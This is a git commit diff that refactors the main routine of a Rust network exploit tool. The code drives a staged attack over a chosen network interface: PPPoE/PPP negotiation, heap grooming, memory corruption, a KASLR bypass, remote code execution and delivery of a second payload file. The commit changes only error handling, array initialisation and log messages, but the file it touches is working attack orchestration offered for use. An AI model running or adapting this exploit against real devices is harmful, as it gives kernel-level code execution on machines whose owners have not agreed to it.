8269b6651d74e4c7d8128ecf3f439c0f951d68a3
fedebuonco <federico.buonco@gmail.com>
2024-10-20 15:10:53 +0100

    Better main

--- src/main.rs
+++ src/main.rs
@@ -4,7 +4,7 @@ mod parser;
 
 use exploit::Exploit;
 use parser::{get_args, Args};
-use pnet::datalink::{self, NetworkInterface};
+use pnet::datalink::{self};
 
 use std::fs::File;
 use std::io::{self, Read};
@@ -18,35 +18,38 @@ fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
 
 fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String) {
     // Find interface
-    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
-    // Find the network interface with the provided name
-    let interfaces = datalink::interfaces();
-    let interface = interfaces.into_iter().find(interface_names_match).unwrap();
+    let interface = datalink::interfaces()
+        .into_iter()
+        .find(|iface| iface.name == interface_name)
+        .expect("Failed to find the network interface");
 
     // Load binaries of the two pyaloads
-    let stage1 = read_stage(&stage1_path);
-    let stage2 = read_stage(&stage2_path);
+    let stage1 = read_stage(&stage1_path).expect("Failed to read Stage 1 file");
+    let stage2 = read_stage(&stage2_path).expect("Failed to read Stage 2 file");
 
     // Exploit
     let mut expl = Exploit {
-        source_mac: [0, 0, 0, 0, 0, 0],
-        target_mac: [0, 0, 0, 0, 0, 0],
+        source_mac: [0; 6], // Using array initialization
+        target_mac: [0; 6],
         pppoe_softc: 0,
-        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
-        target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
-        source_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
+        host_uniq: [0; 8],
+        target_ipv6: [0; 16],
+        source_ipv6: [0; 16],
         kaslr_offset: 0,
     };
-    // LCP
+
+    // LCP Echo handler
     let mut handler = exploit::LcpEchoHandler::new(&interface);
     handler.start();
-    // Initial negotiations
-    println!("[*] Starting Negotiations ...");
+
+    // Stages of the exploit
+    println!("[+] Starting Negotiations ...");
     expl.ignore_first_padi(&interface);
     expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
-    println!("[+] Initial Negotiations Done... Wait for interface to be ready");
+    println!("[+] Initial Negotiations Done...");
+    println!("[+] Wait for interface to be ready");
     println!("[+] Starting Heap Grooming...");
     expl.heap_grooming(&interface);
     println!("[+] STAGE 1: Memory corruption");
@@ -54,13 +57,15 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     println!("[+] STAGE 2: KASLR defeat");
     expl.defeat_kaslr(&interface);
     println!("[+] STAGE 3: Remote code execution");
-    expl.remote_code_exec(&interface, stage1.unwrap());
+    expl.remote_code_exec(&interface, stage1);
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("[+] STAGE 4: Arbitrary payload execution");
-    expl.frag_and_send(&interface, stage2.unwrap());
+    expl.frag_and_send(&interface, stage2);
     println!("[+] DONE!");
+
+    // Stop the LCP handler
     handler.stop();
 }
 
